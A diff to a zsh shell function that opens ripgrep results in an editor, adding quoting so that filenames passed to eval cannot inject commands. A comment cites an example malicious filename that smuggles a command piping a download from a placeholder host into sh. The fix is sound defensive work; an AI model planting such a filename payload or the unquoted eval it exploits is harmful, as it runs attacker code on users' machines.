@@ -180,8 +180,17 @@ frg() {
 				# pattern as the end-of-string anchor, so %f never matched and
 				# %l matched only a trailing "l". Broken on Linux too — the
 				# README's own `hx %f:%l` example emitted `hx %f:%2`.
-				local open_cmd="${EDITOR_LINENO_FMT//\%f/$file}"
-				open_cmd="${open_cmd//\%l/$linenum}"
+				# ${(q)file}, not $file: this string is handed to eval, and
+				# the candidate filenames come from ripgrep over $dir — a
+				# cloned repo or an extracted archive supplies them. A file
+				# named `a;curl evil|sh;b` would otherwise run.
+				#
+				# Escaping %f/%l is what made this branch reachable at all:
+				# zsh reads a leading % in a ${var//pat/repl} pattern as the
+				# end-of-string anchor, so before that fix nothing substituted
+				# and the eval only ever saw the literal format string.
+				local open_cmd="${EDITOR_LINENO_FMT//\%f/${(q)file}}"
+				open_cmd="${open_cmd//\%l/${(q)linenum}}"
 				eval "$open_cmd"
 			elif [[ "${EDITOR:-}" == *code* ]]; then
 				code -g "${file}:${linenum}"
